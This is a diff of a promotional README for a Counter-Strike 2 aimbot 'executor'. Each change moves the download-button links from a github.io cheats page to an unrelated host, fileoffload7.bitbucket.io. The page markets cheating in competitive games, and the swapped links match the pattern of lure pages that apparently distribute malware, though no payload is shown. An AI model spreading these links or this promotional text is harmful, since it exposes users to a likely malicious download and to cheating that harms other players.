@@ -4,7 +4,7 @@
 
 Counter-Strike 2 (CS2) has revolutionized tactical shooters, offering intense gameplay and competitive dynamics. For players aiming to sharpen their skills and gain an edge, aimbots have emerged as a tool to enhance aiming precision and overall performance.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://wecheaters.github.io/cheats/cs2)
+[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🛠️ Product Description
@@ -19,7 +19,7 @@ Aimbots are software tools designed to assist players in aiming, ensuring that t
 
 These tools are especially beneficial for players looking to refine their skills and achieve consistent results in competitive matches.
 
-[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FfrajxXI.jpeg&hash=5533418440ea0052719ead721fd27192https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FfrajxXI.jpeg&hash=5533418440ea0052719ead721fd27192)](https://wecheaters.github.io/cheats/cs2)
+[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FfrajxXI.jpeg&hash=5533418440ea0052719ead721fd27192https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FfrajxXI.jpeg&hash=5533418440ea0052719ead721fd27192)](https://fileoffload7.bitbucket.io)
 ---
 
 ## ✨ Features
